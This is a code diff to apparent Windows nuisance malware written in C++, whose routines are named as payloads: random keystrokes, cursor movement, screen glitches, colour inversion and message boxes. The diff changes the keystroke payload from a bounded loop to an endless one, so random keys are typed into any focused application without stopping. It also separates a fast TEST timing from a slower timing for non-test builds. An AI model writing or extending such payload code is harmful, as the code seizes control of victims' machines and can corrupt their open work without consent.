@@ -102,6 +102,7 @@ void PayloadKeyboardInput(void)
 {
 	INPUT input;
 	// 0-9 a-z
+	// TODO: curate list
 	std::uniform_int_distribution<int> dist(0x30, 0x5A);
 
 	input.type = INPUT_KEYBOARD;
@@ -109,7 +110,7 @@ void PayloadKeyboardInput(void)
 	input.ki.time = 0;
 	input.ki.dwExtraInfo = 0;
 	input.ki.dwFlags = 0; // 0 for key press
-	for (int i = 0; i < 20; ++i) {
+	for (;;) {
 		input.ki.wVk = dist(mt);
 		SendInput(1, &input, sizeof(input));
 		//input.ki.dwFlags = KEYEVENTF_KEYUP; // KEYEVENTF_KEYUP for key release
@@ -168,14 +169,18 @@ void LaunchPayloads(void)
 	std::array<std::function<void(void)>, 5> payloads = {
 			PayloadKeyboardInput,
 			PayloadCursor,
-			PayloadMessageBox,
 			PayloadScreenGlitch,
+			PayloadMessageBox,
 			PayloadInvert
 	};
 
 	for (unsigned i = 0; i < payloads.size(); i++) {
 		std::thread(payloads.at(i)).detach();
+#ifdef TEST
 		std::this_thread::sleep_for(std::chrono::seconds(5));
+#else
+		std::this_thread::sleep_for(std::chrono::seconds(60));
+#endif
 	}
 }
 
